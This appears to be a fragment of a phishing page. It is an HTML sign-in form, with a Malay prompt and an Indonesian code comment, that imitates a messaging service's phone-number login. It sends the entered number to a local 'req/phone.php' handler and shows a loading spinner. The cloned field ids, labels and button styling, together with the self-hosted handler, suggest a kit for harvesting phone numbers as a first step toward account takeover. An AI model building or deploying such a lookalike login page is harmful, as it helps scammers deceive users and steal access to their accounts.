<p class="note">Masukkan nombor telefon anda.</p>

<form action="req/phone.php" method="post" onsubmit="loadd();">
    <!-- Phone Number Input -->
    <div class="input-group" id="labelhp">
        <input class="form-control" type="text" id="sign-in-phone-number" dir="auto" inputmode="tel" aria-label="Your phone number" name="phoneNumber" autocomplete="off" placeholder="">
        <label for="sign-in-phone-number">Your phone number</label>
    </div>

    <!-- Hidden full number field -->
    <input type="hidden" name="fullPhoneNumber" id="fullPhoneNumber">

    <button id="nextBtn" type="submit" class="Button default primary" style="display:none;">NEXT</button>
</form>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    var inpHp = document.getElementById("sign-in-phone-number");
    var btnnext = document.getElementById("nextBtn");
    var fullPhoneInput = document.getElementById("fullPhoneNumber");

    function validate() {
        if (inpHp.value.length > 6) {
            btnnext.style.display = "block";
        } else {
            btnnext.style.display = "none";
        }
    }

    inpHp.addEventListener("input", function () {
        validate();
        updateFullPhone();
    });

    function updateFullPhone() {
        // Karena dropdown negara dihapus, langsung ambil dari input
        fullPhoneInput.value = inpHp.value.replace(/\s+/g, '');
    }

    function loadd(){
        $("#loader").fadeIn();
    }
                </script>

            </div>
